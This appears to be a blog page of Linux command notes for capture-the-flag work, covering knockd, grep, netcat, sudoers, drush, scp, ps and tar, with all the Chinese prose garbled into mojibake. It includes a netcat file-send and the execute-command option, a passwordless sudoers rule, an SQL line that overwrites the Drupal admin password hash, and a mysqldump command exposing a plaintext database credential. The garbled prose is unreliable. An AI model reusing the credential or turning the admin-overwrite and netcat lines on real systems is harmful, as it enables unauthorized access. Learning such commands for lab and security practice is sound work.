<h2 id="knockd-æœåŠ¡"><a href="#knockd-æœåŠ¡" class="headerlink" title="knockd æœåŠ¡"></a>knockd æœåŠ¡</h2><h3 id="é…ç½®æ–‡ä»¶ï¼š-etc-knockd-conf"><a href="#é…ç½®æ–‡ä»¶ï¼š-etc-knockd-conf" class="headerlink" title="é…ç½®æ–‡ä»¶ï¼š&#x2F;etc&#x2F;knockd.conf"></a>é…ç½®æ–‡ä»¶ï¼š&#x2F;etc&#x2F;knockd.conf</h3><h3 id="åŠŸèƒ½ï¼š"><a href="#åŠŸèƒ½ï¼š" class="headerlink" title="åŠŸèƒ½ï¼š"></a>åŠŸèƒ½ï¼š</h3><p>ç«¯å£æ•²å‡»æœåŠ¡ï¼Œé€šè¿‡ç‰¹å®šç«¯å£è®¿é—®åºåˆ—è§¦å‘é˜²ç«å¢™è§„åˆ™</p>
<h3 id="åº”ç”¨ç¤ºä¾‹"><a href="#åº”ç”¨ç¤ºä¾‹" class="headerlink" title="åº”ç”¨ç¤ºä¾‹"></a>åº”ç”¨ç¤ºä¾‹</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŒ‰é¡ºåºæ•²å‡»ç«¯å£ 1111,2222,3333</span></span><br><span class="line"><span class="attribute">knock</span> -v <span class="number">192.168.1.10</span> <span class="number">1111</span> <span class="number">2222</span> <span class="number">3333</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ‹è¯•ç«¯å£å¼€æ”¾æƒ…å†µ</span></span><br><span class="line"><span class="attribute">nmap</span> -p <span class="number">80</span> <span class="number">192.168.1.10</span></span><br></pre></td></tr></table></figure></div>
<h2 id="grep-æ–‡æœ¬æœç´¢å·¥å…·"><a href="#grep-æ–‡æœ¬æœç´¢å·¥å…·" class="headerlink" title="grep æ–‡æœ¬æœç´¢å·¥å…·"></a>grep æ–‡æœ¬æœç´¢å·¥å…·</h2><h3 id="å…ƒå­—ç¬¦è¡¨"><a href="#å…ƒå­—ç¬¦è¡¨" class="headerlink" title="å…ƒå­—ç¬¦è¡¨"></a>å…ƒå­—ç¬¦è¡¨</h3><table>
<thead>
<tr>
<th>å…ƒå­—ç¬¦</th>
<th>åŠŸèƒ½</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td>^</td>
<td>è¡Œé¦–å®šä½ç¬¦</td>
<td>^start</td>
</tr>
<tr>
<td>$</td>
<td>è¡Œå°¾å®šä½ç¬¦</td>
<td>end$</td>
</tr>
<tr>
<td>.*</td>
<td>ä»»æ„å­—ç¬¦ï¼ˆ0 æˆ–å¤šä¸ªï¼‰</td>
<td>a.*b</td>
</tr>
<tr>
<td>[]</td>
<td>å­—ç¬¦é›†åˆåŒ¹é…</td>
<td>[aeiou]</td>
</tr>
<tr>
<td>&lt;</td>
<td>å•è¯å¼€å¤´</td>
<td>&lt;word</td>
</tr>
</tbody></table>
<h3 id="å¸¸ç”¨å‚æ•°-1"><a href="#å¸¸ç”¨å‚æ•°-1" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>-E</td>
<td>ä½¿ç”¨æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼ï¼ˆç­‰ä»·äº <code>grep -E</code> &#x3D; <code>egrep</code>ï¼‰</td>
</tr>
<tr>
<td>-i</td>
<td>æ¯”è¾ƒå­—ç¬¦æ—¶å¿½ç•¥å¤§å°å†™</td>
</tr>
<tr>
<td>-w</td>
<td>åªåŒ¹é…å®Œæ•´çš„è¯ï¼Œç­‰ä»·äºæ­£åˆ™ä¸­çš„ <code>\&lt;...\&gt;</code></td>
</tr>
<tr>
<td>-x</td>
<td>åªåŒ¹é…æ•´è¡Œå†…å®¹ï¼Œç­‰ä»·äºæ­£åˆ™ä¸­çš„ <code>^...$</code></td>
</tr>
<tr>
<td>-v</td>
<td>å–åï¼Œè¾“å‡ºä¸ç¬¦åˆæ¨¡å¼çš„å†…å®¹</td>
</tr>
<tr>
<td>-c</td>
<td>ç»Ÿè®¡åŒ¹é…åˆ°çš„è¡Œæ•°ï¼ˆè¡Œæ•°è€ŒéåŒ¹é…çš„æ¬¡æ•°ï¼‰</td>
</tr>
<tr>
<td>-m</td>
<td>åªåŒ¹é…è§„å®šçš„è¡Œæ•°ï¼Œä¹‹åä¸å†ç»§ç»­åŒ¹é…</td>
</tr>
<tr>
<td>-n</td>
<td>åœ¨è¾“å‡ºç»“æœä¸­æ˜¾ç¤ºè¡Œå·ï¼ŒæŒ‡çš„æ˜¯æ–‡ä»¶ä¸­åŸå§‹çš„è¡Œå·</td>
</tr>
<tr>
<td>-o</td>
<td>åªæ˜¾ç¤ºåŒ¹é…çš„éƒ¨åˆ†ï¼Œè€Œéæ•´è¡Œå†…å®¹</td>
</tr>
<tr>
<td>-r</td>
<td>æœç´¢æ‰€æœ‰æ–‡ä»¶ï¼Œä½†ä¸è·Ÿéšç¬¦å·é“¾æ¥</td>
</tr>
<tr>
<td>-R</td>
<td>é€’å½’æœç´¢ï¼Œé€‚ç”¨äºç›®å½•ä¸­çš„å¤šä¸ªæ–‡ä»¶æˆ–ç›®å½•</td>
</tr>
<tr>
<td>-B</td>
<td>è¾“å‡ºåŒ¹é…è¡Œä¹‹å‰çš„è‹¥å¹²è¡Œï¼Œä¾‹å¦‚ <code>grep -B 3 &quot;aa&quot; file</code> è¾“å‡ºåŒ…å« â€œaaâ€ çš„è¡Œä»¥åŠå‰ 3 è¡Œ</td>
</tr>
<tr>
<td>-A</td>
<td>è¾“å‡ºåŒ¹é…è¡Œä¹‹åçš„è‹¥å¹²è¡Œ</td>
</tr>
<tr>
<td>-C</td>
<td>åŒæ—¶æ˜¾ç¤ºåŒ¹é…è¡Œçš„å‰åå‡ è¡Œï¼Œç­‰ä»·äºåŒæ—¶ä½¿ç”¨ <code>-B</code> å’Œ <code>-A</code></td>
</tr>
</tbody></table>
<h3 id="ä½¿ç”¨ç¤ºä¾‹"><a href="#ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">grep</span> -i <span class="string">&quot;hello&quot;</span> <span class="keyword">file</span>.txt # å¿½ç•¥å¤§å°å†™æŸ¥æ‰¾</span><br><span class="line"><span class="keyword">grep</span> -n <span class="string">&quot;pattern&quot;</span> <span class="keyword">file</span>.txt # æŸ¥æ‰¾æ–‡ä»¶ <span class="keyword">file</span>.txt ä¸­åŒ…å« <span class="string">&quot;pattern&quot;</span> çš„è¡Œï¼Œå¹¶æ˜¾ç¤ºè¡Œå·</span><br><span class="line"><span class="keyword">grep</span> -r <span class="string">&quot;pattern&quot;</span> /path/<span class="keyword">to</span>/directory/  # åœ¨ /path/<span class="keyword">to</span>/directory ç›®å½•ä¸‹é€’å½’æŸ¥æ‰¾åŒ…å« <span class="string">&quot;pattern&quot;</span> çš„æ–‡ä»¶</span><br><span class="line"><span class="keyword">grep</span> -<span class="keyword">o</span> <span class="string">&quot;pattern&quot;</span> <span class="keyword">file</span>.txt # åœ¨æ–‡ä»¶ <span class="keyword">file</span>.txt ä¸­æŸ¥æ‰¾ <span class="string">&quot;pattern&quot;</span> å¹¶åªæ˜¾ç¤ºåŒ¹é…åˆ°çš„éƒ¨åˆ†</span><br><span class="line"><span class="keyword">grep</span> -v <span class="string">&quot;error&quot;</span> <span class="built_in">log</span>.txt # è¾“å‡º <span class="built_in">log</span>.txt ä¸­ä¸åŒ…å« <span class="string">&quot;error&quot;</span> çš„è¡Œ</span><br><span class="line"><span class="keyword">grep</span> -A <span class="number">3</span> <span class="string">&quot;error&quot;</span> <span class="built_in">log</span>.txt # åœ¨æ–‡ä»¶ <span class="built_in">log</span>.txt ä¸­æŸ¥æ‰¾ <span class="string">&quot;error&quot;</span> å¹¶æ˜¾ç¤ºè¯¥è¡Œä»¥åŠä¹‹åçš„ <span class="number">3</span> è¡Œ</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h2 id="nc-Netcat-ç½‘ç»œå·¥å…·"><a href="#nc-Netcat-ç½‘ç»œå·¥å…·" class="headerlink" title="nc (Netcat) ç½‘ç»œå·¥å…·"></a>nc (Netcat) ç½‘ç»œå·¥å…·</h2><h3 id="å¸¸ç”¨å‚æ•°-2"><a href="#å¸¸ç”¨å‚æ•°-2" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>-l</td>
<td>ç›‘å¬æ¨¡å¼</td>
</tr>
<tr>
<td>-v</td>
<td>æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</td>
</tr>
<tr>
<td>-n</td>
<td>ç¦ç”¨ DNS è§£æ</td>
</tr>
<tr>
<td>-p PORT</td>
<td>æŒ‡å®šæœ¬åœ°ç«¯å£</td>
</tr>
<tr>
<td>-u</td>
<td>UDP æ¨¡å¼</td>
</tr>
<tr>
<td>-e CMD</td>
<td>è¿æ¥åæ‰§è¡Œå‘½ä»¤</td>
</tr>
<tr>
<td>-w TIME</td>
<td>è®¾ç½®è¿æ¥è¶…æ—¶ï¼Œå•ä½ä¸ºç§’</td>
</tr>
<tr>
<td>-z</td>
<td>æ‰«ææ¨¡å¼ï¼Œä¸å‘é€æ•°æ®ï¼Œåªè¿›è¡Œç«¯å£æ‰«æ</td>
</tr>
</tbody></table>
<h3 id="ä½¿ç”¨ç¤ºä¾‹-1"><a href="#ä½¿ç”¨ç¤ºä¾‹-1" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç›‘å¬ç«¯å£ 4444</span></span><br><span class="line"><span class="attribute">nc</span> -lp <span class="number">4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€æ–‡ä»¶</span></span><br><span class="line"><span class="attribute">nc</span> -w <span class="number">3</span> <span class="number">192.168.1.100</span> <span class="number">4444</span> &lt; file.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># UDPç«¯å£æ‰«æ</span></span><br><span class="line"><span class="attribute">nc</span> -zuv <span class="number">192.168.1.1</span> <span class="number">1</span>-<span class="number">1000</span></span><br></pre></td></tr></table></figure></div>
<h2 id="sudo-æƒé™ç®¡ç†"><a href="#sudo-æƒé™ç®¡ç†" class="headerlink" title="sudo æƒé™ç®¡ç†"></a>sudo æƒé™ç®¡ç†</h2><p><strong>é…ç½®æ–‡ä»¶</strong>ï¼š&#x2F;etc&#x2F;sudoers</p>
<h3 id="å…¸å‹é…ç½®"><a href="#å…¸å‹é…ç½®" class="headerlink" title="å…¸å‹é…ç½®"></a>å…¸å‹é…ç½®</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NSIS"><figure class="iseeu highlight /nsis"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å…è®¸ç”¨æˆ·å…å¯†ç æ‰§è¡Œæ‰€æœ‰å‘½ä»¤</span></span><br><span class="line">username <span class="literal">ALL</span>=(<span class="literal">ALL</span>) NOPASSWD: <span class="literal">ALL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å…è®¸ç»„æ‰§è¡Œç‰¹å®šå‘½ä»¤</span></span><br><span class="line">%<span class="literal">admin</span> <span class="literal">ALL</span>=/usr/bin/apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># root ç”¨æˆ·å¯ä»¥åœ¨ä»»ä½•ä¸»æœºä¸Šã€ä»¥ä»»ä½•ç”¨æˆ·èº«ä»½ä»¥åŠä»»ä½•ç»„èº«ä»½æ‰§è¡Œæ‰€æœ‰å‘½ä»¤ã€‚</span></span><br><span class="line">root	<span class="literal">ALL</span>=(<span class="literal">ALL</span>:<span class="literal">ALL</span>) <span class="literal">ALL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sudo ç»„çš„æˆå‘˜å¯ä»¥åœ¨ä»»ä½•ä¸»æœºä¸Šã€ä»¥ä»»ä½•ç”¨æˆ·èº«ä»½å’Œä»»ä½•ç»„èº«ä»½æ‰§è¡Œæ‰€æœ‰å‘½ä»¤ã€‚</span></span><br><span class="line">%sudo	<span class="literal">ALL</span>=(<span class="literal">ALL</span>:<span class="literal">ALL</span>) <span class="literal">ALL</span></span><br></pre></td></tr></table></figure></div>
<h2 id="drush-Drupal-Shell"><a href="#drush-Drupal-Shell" class="headerlink" title="drush (Drupal Shell)"></a>drush (Drupal Shell)</h2><p>(Drush &#x3D; Drupal + Shell) å°±æ˜¯ä½¿ç”¨å‘½ä»¤è¡Œå‘½ä»¤æ¥æ“ä½œ Drupal ç«™ç‚¹ï¼Œå®ƒçš„å‘½ä»¤æ ¼å¼ä¸ git ç±»ä¼¼ï¼Œéƒ½æ˜¯åŒå­—å‘½ä»¤ï¼ˆdrush + å®é™…çš„å‘½ä»¤ï¼‰ã€‚ä¸ºäº†ä½¿ç”¨ Drushï¼Œå¿…é¡»å…ˆå‘Šè¯‰ Drush è¦æ“ä½œå“ªä¸ªç«™ç‚¹ï¼Œ<strong>ä¸€ä¸ªæœ€ç›´æ¥çš„æ–¹æ³•æ˜¯å°†å½“å‰ç›®å½•è½¬åˆ°è¦æƒ³æ“ä½œçš„ç«™ç‚¹ç›®å½•ä¸‹ï¼ŒDrush å°±è‡ªåŠ¨å°†æ“ä½œåº”ç”¨äºå½“å‰ç›®å½•ä¸‹çš„ç«™ç‚¹</strong>ã€‚<br>å¸¸ç”¨æŒ‡ä»¤ï¼š<br><strong>å¯ç”¨æ¨¡å— &#x2F; ç¦ç”¨æ¨¡å—</strong>  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">drush en/dis project_name  </span><br><span class="line">drush pm-uninstall modulename <span class="comment">#å…ˆç¦ç”¨å†åˆ é™¤</span></span><br></pre></td></tr></table></figure></div>
<p><strong>å¸è½½æ¨¡å—</strong>  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line">drush pmu <span class="keyword">module</span> -y</span><br></pre></td></tr></table></figure></div>
<p><strong>æ•°æ®åº“å¯¼å‡º ï¼ˆåœ¨å¯¼å‡ºä¹‹å‰ drush cc allï¼‰</strong>  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">drush <span class="keyword">sql</span>-dump &gt; DB.<span class="keyword">sql</span>  </span><br><span class="line">drush <span class="keyword">sql</span>-dump â€“gzip &gt; DB.tar.gz ### å¯¼å‡ºæ•°æ®åº“å¹¶å‹ç¼©  </span><br><span class="line">mysqldump -p site &gt; db.<span class="keyword">sql</span>  </span><br><span class="line">drush <span class="keyword">sql</span>-dump &gt; db.<span class="keyword">sql</span> â€”gzip â€”result=/backups/example.<span class="keyword">sql</span>  </span><br><span class="line">mysqldump -h192<span class="number">.168</span><span class="number">.42</span><span class="number">.1</span> -uyuc -pQ5p94qAk47 â€“databases intg_hit &gt;hit.<span class="keyword">sql</span></span><br></pre></td></tr></table></figure></div>
<p><strong>æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯</strong>  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">drush <span class="keyword">user</span><span class="operator">-</span>information biaoge,maike  </span><br><span class="line">ç»™ maike ä¸€ä¸ª <span class="keyword">member</span> çš„è§’è‰²  </span><br><span class="line">drush urol <span class="keyword">member</span> maike</span><br></pre></td></tr></table></figure></div>
<p><strong>æ–°å»ºä¼šå‘˜</strong>  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">drush ucrt zhangsan â€“<span class="attribute">password</span>=111111</span><br></pre></td></tr></table></figure></div>
<p><strong>åˆ›å»ºæ–°ç”¨æˆ·</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">drush user-create ç”¨æˆ·å --mail<span class="operator">=</span><span class="string">&quot;é‚®ç®±&quot;</span> --password<span class="operator">=</span><span class="string">&quot;å¯†ç &quot;</span></span><br></pre></td></tr></table></figure></div>
<p><strong>ä¿®æ”¹å¯†ç </strong><br><code>php scripts/password-hash.sh &#39;yourpassword&#39;</code><br><code>drush upwd root --password=&quot;****&quot;</code><br><code>UPDATE users SET name=&#39;admin&#39;, pass=&#39;$S$DfQ/y58nGpZvyRLYd3LSyJ.s82xSC3Z.2oxdCIL4EHKAYcQnDl9T&#39; WHERE uid = 1**;</code><br><strong>drush -status</strong>   æŸ¥çœ‹ç‰ˆæœ¬ç­‰ä¿¡æ¯</p>
<h2 id="scp-å®‰å…¨æ–‡ä»¶ä¼ è¾“"><a href="#scp-å®‰å…¨æ–‡ä»¶ä¼ è¾“" class="headerlink" title="scp å®‰å…¨æ–‡ä»¶ä¼ è¾“"></a>scp å®‰å…¨æ–‡ä»¶ä¼ è¾“</h2><p><code>scp</code> æ˜¯ä¸€ä¸ªåŸºäº SSH åè®®çš„æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼Œç”¨äºåœ¨æœ¬åœ°ä¸è¿œç¨‹ä¸»æœºä¹‹é—´æˆ–ä¸¤å°è¿œç¨‹ä¸»æœºä¹‹é—´å®‰å…¨åœ°æ‹·è´æ–‡ä»¶ã€‚<code>scp</code> çš„å…¨ç§°æ˜¯ <strong>Secure Copy</strong>ï¼Œå®ƒçš„ç”¨æ³•ä¸ <code>cp</code> ç±»ä¼¼ï¼Œä½†æ”¯æŒè¿œç¨‹æ–‡ä»¶ä¼ è¾“</p>
<h3 id="ä½¿ç”¨ç¤ºä¾‹-2"><a href="#ä½¿ç”¨ç¤ºä¾‹-2" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸‹è½½è¿œç¨‹æ–‡ä»¶</span></span><br><span class="line">scp user<span class="variable">@remote</span><span class="symbol">:/path/file</span>.txt local_dir</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸Šä¼ ç›®å½•ï¼ˆé€’å½’ï¼‰</span></span><br><span class="line">scp -r local_dir user<span class="variable">@remote</span><span class="symbol">:/path/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‡å®šç«¯å£</span></span><br><span class="line">scp -P <span class="number">2222</span> file.txt user<span class="variable">@remote</span><span class="symbol">:/path/</span></span><br></pre></td></tr></table></figure></div>
<h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><p><code>ps</code> æ˜¯ Linux å’Œ Unix ç³»ç»Ÿä¸­ç”¨äºæŸ¥çœ‹å½“å‰ç³»ç»Ÿä¸­è¿è¡Œçš„è¿›ç¨‹çŠ¶æ€çš„å‘½ä»¤ã€‚å®ƒæ˜¯ <strong>Process Status</strong> çš„ç¼©å†™ï¼Œæä¾›ç³»ç»Ÿä¸­æ´»åŠ¨è¿›ç¨‹çš„ä¿¡æ¯</p>
<h3 id="å¸¸ç”¨å‚æ•°-3"><a href="#å¸¸ç”¨å‚æ•°-3" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>-e</code></td>
<td>æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ã€‚</td>
</tr>
<tr>
<td><code>-f</code></td>
<td>å…¨æ ¼å¼æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯ï¼ˆåŒ…å«çˆ¶è¿›ç¨‹ç­‰ä¿¡æ¯ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>-u [user]</code></td>
<td>æ˜¾ç¤ºæŸä¸ªç”¨æˆ·çš„è¿›ç¨‹ã€‚</td>
</tr>
<tr>
<td><code>-p [pid]</code></td>
<td>æ˜¾ç¤ºç‰¹å®šè¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td><code>-a</code></td>
<td>æ˜¾ç¤ºæ‰€æœ‰ç»ˆç«¯ç›¸å…³çš„è¿›ç¨‹ï¼ˆä¸åŒ…æ‹¬ä¼šè¯é¦–è¿›ç¨‹ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>-x</code></td>
<td>æ˜¾ç¤ºæ²¡æœ‰æ§åˆ¶ç»ˆç«¯çš„è¿›ç¨‹ï¼ˆåå°è¿›ç¨‹ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>-l</code></td>
<td>é•¿æ ¼å¼æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td><code>--forest</code></td>
<td>æ˜¾ç¤ºè¿›ç¨‹çš„å±‚çº§ç»“æ„ã€‚</td>
</tr>
</tbody></table>
<p>ä¸€èˆ¬ç”¨-ef</p>
<h2 id="apache2"><a href="#apache2" class="headerlink" title="apache2"></a>apache2</h2><p>è®¿é—®æ–‡ä»¶çš„ç›®å½•æ˜¯&#x2F;var&#x2F;www&#x2F;html   è®¿é—®è®°å½•åœ¨&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p>
<h2 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h2><p>catæŒ‡ä»¤åè¿‡æ¥  è®©æ•°æ®ä»æœ€åä¸€è¡Œå¼€å§‹é¢ å€’  ä½†æ˜¯æ¯è¡Œå†…å®¹ä¸å˜ é€‚åˆé¢˜ç›®ç»™äº†ä¸€ä¸ªpasswordsæ–‡ä»¶ ä»åé¢å¼€å§‹çˆ†ç ´</p>
<h2 id="var-mail"><a href="#var-mail" class="headerlink" title="&#x2F;var&#x2F;mail"></a>&#x2F;var&#x2F;mail</h2><p>å­˜æ”¾ç”¨æˆ·é‚®ä»¶çš„åœ°æ–¹ é‡Œé¢å¯èƒ½æœ‰æœ‰ç”¨çš„ä¿¡æ¯</p>
<h2 id="etc-release"><a href="#etc-release" class="headerlink" title="&#x2F;etc&#x2F;release"></a>&#x2F;etc&#x2F;release</h2><p>è¿™ä¸ªç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶å¯ä»¥æŸ¥çœ‹å½“å‰linuxçš„ç‰ˆæœ¬ä¿¡æ¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/etc/</span>os-release: åŒ…å«å…¨é¢çš„å‘è¡Œç‰ˆä¿¡æ¯ï¼Œé€‚ç”¨äºå¤§å¤šæ•°ç°ä»£ Linux å‘è¡Œç‰ˆã€‚</span><br><span class="line"><span class="regexp">/etc/i</span>ssue: æ˜¾ç¤ºç®€çŸ­çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œé€šå¸¸åœ¨ç™»å½•æ—¶å‡ºç°ã€‚</span><br><span class="line"><span class="regexp">/etc/</span>debian_version: é€‚ç”¨äºåŸºäº Debian çš„ç³»ç»Ÿï¼Œå¦‚ Ubuntuã€‚</span><br><span class="line"><span class="regexp">/etc/</span>redhat-release: é€‚ç”¨äºåŸºäº RHEL çš„ç³»ç»Ÿï¼Œå¦‚ CentOS å’Œ Fedoraã€‚</span><br><span class="line"><span class="regexp">/etc/</span>centos-release: é€‚ç”¨äº CentOS ç³»ç»Ÿã€‚</span><br><span class="line"><span class="regexp">/etc/</span>hostname: æ˜¾ç¤ºä¸»æœºåï¼Œè€Œéç‰ˆæœ¬ä¿¡æ¯</span><br></pre></td></tr></table></figure></div>

<h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><h3 id="å¸¸ç”¨å‚æ•°-4"><a href="#å¸¸ç”¨å‚æ•°-4" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>-x</td>
<td>æå–å½’æ¡£æ–‡ä»¶ä¸­çš„å†…å®¹ã€‚ç”¨äºå°†å½’æ¡£æ–‡ä»¶è§£å‹ç¼©å¹¶æå–å…¶ä¸­çš„æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td>-f</td>
<td>æŒ‡å®šå½’æ¡£æ–‡ä»¶çš„åç§°ã€‚æ­¤é€‰é¡¹åé¢å¿…é¡»è·Ÿä¸Šæ–‡ä»¶è·¯å¾„æˆ–æ–‡ä»¶åï¼Œç”¨äºå‘Šè¯‰å‘½ä»¤æ“ä½œçš„æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td>-v</td>
<td>æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ã€‚åœ¨è§£å‹ç¼©æˆ–å½’æ¡£æ—¶ï¼Œä½¿ç”¨æ­¤é€‰é¡¹å°†åˆ—å‡ºæ­£åœ¨å¤„ç†çš„æ–‡ä»¶åï¼Œå¸®åŠ©ç”¨æˆ·è¿½è¸ªè¿‡ç¨‹ã€‚</td>
</tr>
<tr>
<td>-z</td>
<td>å¦‚æœå½’æ¡£æ˜¯ gzip å‹ç¼©çš„ï¼Œåˆ™è§£å‹ã€‚ç”¨äºè§£å‹ç¼© <code>.gz</code> æ ¼å¼çš„æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td>-j</td>
<td>å¦‚æœå½’æ¡£æ˜¯ bzip2 å‹ç¼©çš„ï¼Œåˆ™è§£å‹ã€‚ç”¨äºè§£å‹ç¼© <code>.bz2</code> æ ¼å¼çš„æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td>-J</td>
<td>å¦‚æœå½’æ¡£æ˜¯ xz å‹ç¼©çš„ï¼Œåˆ™è§£å‹ã€‚ç”¨äºè§£å‹ç¼© <code>.xz</code> æ ¼å¼çš„æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td>-c</td>
<td>å°†è¾“å‡ºå‘é€åˆ°æ ‡å‡†è¾“å‡ºï¼Œè€Œä¸æ˜¯ç›´æ¥å†™å…¥æ–‡ä»¶ã€‚å¸¸ç”¨äºå°†å½’æ¡£å†…å®¹è¾“å‡ºåˆ°å±å¹•æˆ–å¦ä¸€ä¸ªå‘½ä»¤ã€‚</td>
</tr>
<tr>
<td>-t</td>
<td>æµ‹è¯•å½’æ¡£æ–‡ä»¶æ˜¯å¦å®Œæ•´ï¼Œæ£€æŸ¥å½’æ¡£ä¸­çš„æ–‡ä»¶æ˜¯å¦å¯ä»¥æ­£å¸¸è§£å‹ç¼©ã€‚</td>
</tr>
<tr>
<td>-u</td>
<td>æ›´æ–°å½’æ¡£æ–‡ä»¶ã€‚ä»…å°†æ¯”å½’æ¡£ä¸­ç°æœ‰æ–‡ä»¶æ›´æ–°çš„æ–‡ä»¶æ·»åŠ åˆ°å½’æ¡£ã€‚</td>
</tr>
<tr>
<td>-p</td>
<td>ä¿ç•™æ–‡ä»¶çš„åŸå§‹æƒé™å’Œæ—¶é—´æˆ³ã€‚åœ¨è§£å‹æ—¶ä¸æ›´æ”¹æ–‡ä»¶çš„æ—¶é—´æˆ³å’Œæƒé™ã€‚</td>
</tr>
</tbody></table>
<h3 id="ä½¿ç”¨ç¤ºä¾‹-3"><a href="#ä½¿ç”¨ç¤ºä¾‹-3" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºå‹ç¼©åŒ…</span></span><br><span class="line">tar czvf archive.tar.gz <span class="built_in">dir</span>/</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å‹åˆ°æŒ‡å®šç›®å½•</span></span><br><span class="line">tar xzvf archive.tar.gz -C /target/dir</span><br></pre></td></tr></table></figure></div>

